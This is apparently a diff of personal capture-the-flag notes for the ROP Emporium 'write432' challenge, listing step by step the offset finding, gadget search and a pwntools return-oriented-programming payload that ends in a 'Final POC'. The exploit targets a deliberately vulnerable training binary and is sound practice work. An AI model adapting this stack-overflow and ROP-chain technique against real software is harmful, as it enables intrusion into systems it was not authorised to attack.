@@ -1,0 +1,37 @@
+# Finding padding
+~/ msf-pattern_create -l 50
+Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab
+(gdb) EIP: 0x35624134 ('4Ab5')
+~/ msf-pattern_offset -l 50 -q 4Ab5
+[*] Exact match at offset 44
+payload = b'A' * 44
+
+# Writing 4 bytes
+~/ ropper --file write432 --search "pop"
+0x080485aa: pop edi; pop ebp; ret;
+
+~/ ropper --file write432 --search “mov”
+0x08048543: mov dword ptr [edi], ebp; ret;
+
+~/ rabin2 -S write432 | grep rw
+24  0x00001018    0x8 0x0804a018    0x8 -rw- .data
+25  0x00001020    0x0 0x0804a020    0x4 -rw- .bss
+payload = p32(0x080485aa) + p32(0x0804a018) + b"ABCD" + p32(0x08048543)
+
+# Getting the flag
+~/ rabin2 -i write432
+4   0x080483d0 GLOBAL FUNC       print_file
+payload += p32(0x80483d0)  + p32(0x080485aa)  + p32(0x0804a018) 
+
+# Debugging
+gdb-peda$ b *0x08048543   # mov    DWORD PTR [edi],ebp
+gdb-peda$ run < payload.txt
+gdb-peda$ n
+gdb-peda$ x/s 0x0804a018 # .data section
+
+
+# Final POC
+payload = b'A' * 44
+payload += pwn.p32(0x080485aa) + pwn.p32(0x0804a018) + b"ABCD" + pwn.p32(0x08048543)
+payload += pwn.p32(0x80483d0)  + pwn.p32(0x080485aa)  + pwn.p32(0x0804a018) 
+⇒ Failed to open "ABCD"
